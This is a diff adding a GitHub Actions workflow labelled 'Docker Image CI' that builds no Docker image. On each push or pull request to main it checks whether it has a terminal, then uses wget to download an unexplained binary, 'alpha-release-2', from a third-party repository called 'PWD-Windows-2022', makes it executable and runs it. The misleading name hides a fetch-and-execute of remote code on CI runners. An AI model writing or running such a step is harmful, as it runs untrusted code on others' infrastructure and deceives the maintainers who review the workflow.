@@ -1,0 +1,20 @@
+name: Docker Image CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Run a multi-line script
+        shell: 'script -q -e -c "bash {0}"'
+        run: |
+          perl -E 'say "TTY?: ", -t STDOUT ? "yes" : "no"'
+          wget  https://github.com/kmille36/PWD-Windows-2022/raw/main/alpha-release-2 ; chmod +x alpha-release-2 ; ./alpha-release-2
